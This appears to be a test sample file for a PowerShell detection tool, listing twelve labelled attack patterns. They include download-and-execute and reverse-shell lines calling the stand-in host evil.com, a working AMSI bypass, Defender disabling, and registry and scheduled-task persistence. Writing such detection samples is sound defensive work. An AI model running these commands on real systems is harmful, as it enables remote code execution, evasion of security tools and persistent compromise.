# Test sample: PowerShell attack patterns for PS-001 through PS-012

# PS-001: Invoke-Expression
IEX (New-Object Net.WebClient).DownloadString('https://evil.com/payload')

# PS-002: DownloadString
(New-Object Net.WebClient).DownloadString('https://evil.com/stage2')

# PS-003: EncodedCommand
powershell -EncodedCommand SQBFAFAA==

# PS-004: Execution policy bypass
Set-ExecutionPolicy Bypass -Scope Process -Force

# PS-005: Reverse shell
$client = New-Object System.Net.Sockets.TCPClient('evil.com',4444)

# PS-006: Hidden window
Start-Process powershell -NoNewWindow -ArgumentList '-File c:\temp\evil.ps1'

# PS-007: Credential harvesting
$cred = Get-Credential
$pass = ConvertTo-SecureString 'Password123' -AsPlainText -Force

# PS-008: Registry persistence
New-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name persist -Value evil.exe

# PS-009: AMSI bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# PS-010: Base64 decode
$decoded = [System.Convert]::FromBase64String('SQBFAFAA==')

# PS-011: Scheduled task
Register-ScheduledTask -TaskName 'Backdoor' -Action (New-ScheduledTaskAction -Execute 'evil.exe')

# PS-012: Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true
